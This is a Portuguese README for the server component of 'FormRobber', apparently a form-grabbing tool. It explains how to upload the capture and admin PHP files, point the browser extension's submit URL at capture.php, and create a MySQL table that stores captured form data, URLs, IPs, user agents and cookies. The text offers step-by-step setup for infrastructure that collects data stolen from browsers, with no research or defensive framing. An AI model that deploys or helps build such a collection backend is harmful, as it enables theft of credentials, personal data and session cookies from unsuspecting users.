# FormRobber (Servidor)
Aqui está o código (HTML, PHP e SQL) que fica armazenado no servidor que receberá os dados capturados pela extensão de navegador.

## Como configurar os arquivos do servidor
* Carregue todos os arquivos deste diretório ([config.php](config.php), [capture.php](capture.php), [admin.php](admin.php), [index.html](index.html), [jquery.min.js](jquery.min.js), [sleep.txt](sleep.txt) e [FormRobber.zip](FormRobber.zip)) em algum diretório do servidor. Deve haver suporte para PHP (com MySQLi) e MySQL Server.
* Atualize o *.ZIP [FormRobber.zip](FormRobber.zip) se for desejável: a variável "formSubmitURL" do arquivo [main.js](../Extensao/main.js) presente neste arquivo não está atualizada com o endereço do servidor (deve ser o endereço completo para a página [capture.php](capture.php)).
* Configure o arquivo [config.php](config.php): é necessário definir o endereço do servidor MySQL (ou _localhost_ caso seja na mesma máquina), o usuário do banco de dados, a senha do banco de dados e o nome do banco de dados. Além disso, é necessário definir uma senha de acesso ao painel de administrador ([admin.php](admin.php)), que por padrão é "admin".

## Como configurar o banco de dados MySQL
* Crie um novo banco de dados com o nome que desejar (utf8mb4_general_ci).
* Neste banco de dados, crie uma tabela com o nome "submits".
* Segue estrutura da tabela _submits_ que deve ser seguida à risca:
	- id: char(128), not null, INDEX (PRIMARY, BTREE, unique, cardinality 10, collation A, not null)
	- clientId: char(255), null, INDEX (BTREE, not unique, cardinality 2, collation A, null)
	- time: timestamp, not null, INDEX (BTREE, not unique, cardinality 10, collation A, not null)
	- ip: char(64), null
	- data: mediumtext, null
	- url: text, not null
	- referrer: text, null
	- userAgent: text, null
	- cookie: text, null
* Crie um usuário do MySQL com o nome e senha desejados. Este será usado para acesso a este banco de dados.
* Dê permissões a este usuário de acessar e modificar a tabela _submits_ criada anteriormente.
* Pronto.

